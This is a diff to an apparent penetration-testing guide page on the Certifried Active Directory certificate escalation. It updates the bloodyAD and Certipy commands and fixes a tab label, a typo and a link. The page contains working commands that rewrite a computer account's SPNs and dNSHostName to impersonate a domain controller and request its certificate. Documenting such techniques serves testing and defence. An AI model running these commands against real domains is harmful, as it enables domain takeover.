@@ -28,7 +28,7 @@ A patch was released in may 2022 to address this vulnerability: [more informatio
 
 Requesting a certificate based on the `Machine` (or `User`) template can indicate whether the patch has been applied or not. If the certificate object contains an SID (`objectSid`), then the patch has been applied.
 
-<Tabs items={['UNIX-like', 'Machine']}>
+<Tabs items={['UNIX-like', 'Windows']}>
 <Tab value="UNIX-like">
 
 This check can be conducted using [Certipy](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&cad=rja\&uact=8\&ved=2ahUKEwjCp86j1fb3AhWpzYUKHSMeBFoQFnoECA8QAQ\&url=https%3A%2F%2Fgithub.com%2Fly4k%2FCertipy\&usg=AOvVaw1D9CAn7Ysn5XMdezp8Aemb) (Python).
@@ -46,7 +46,7 @@ Oliver [underlined](https://research.ifcr.dk/certifried-active-directory-domain-
 
 </Tab>
 
-<Tab value="Machine">
+<Tab value="Windows">
 
 _At the time of writing this recipe, June 2022, no Windows alternative has been found._
 
@@ -69,14 +69,14 @@ The second step is conducted by removing the SPNs that reflect the `dNSHostName`
 The [bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python) tool can be used on UNIX-like systems to operated these changes.
 
 ```bash
-# Clearing the SPNs
-bloodyAD.py -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' serviceprincipalname '[]'
+# Clearing the SPNs (v2: set object with no value clears the attribute)
+bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object "$COMPUTER_NAME$" serviceprincipalname
 
 # Setting the dNSHostName value to the name of a computer account to impersonate
-bloodyAD.py -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName '["$DC_NAME.$DOMAIN"]'
+bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object "$COMPUTER_NAME$" dnsHostName -v "$DC_NAME.$DOMAIN"
 
 # Verifying the dNSHostName value and SPN entries
-bloodyAD.py -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP getObjectAttributes 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName,serviceprincipalname
+bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get object "$COMPUTER_NAME$" --attr dnsHostName,serviceprincipalname
 ```
 [Certipy](https://github.com/ly4k/Certipy) tool can also add a machine account and amend the `dNSHostName` property with the following command liner.
 
@@ -124,7 +124,7 @@ The third and last step consists in getting the certificate of the targeted mach
 
 
 ```bash
-certipy req -u 'compter$'@"$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'Machine'
+certipy req -u 'computer$'@"$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'Machine'
 ```
 
 
@@ -145,7 +145,7 @@ By default, Certipy uses LDAPS, which is not always supported by the domain cont
 ```batch
 Certify.exe request /ca:"domain\ca" /template:"Machine"
 ```
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate.
+The certificate can then be used with [Pass-the-Certificate](/ad/movement/kerberos/pass-the/pass-the-certificate) to obtain a TGT and authenticate.
 
 </Tab>
 </Tabs>
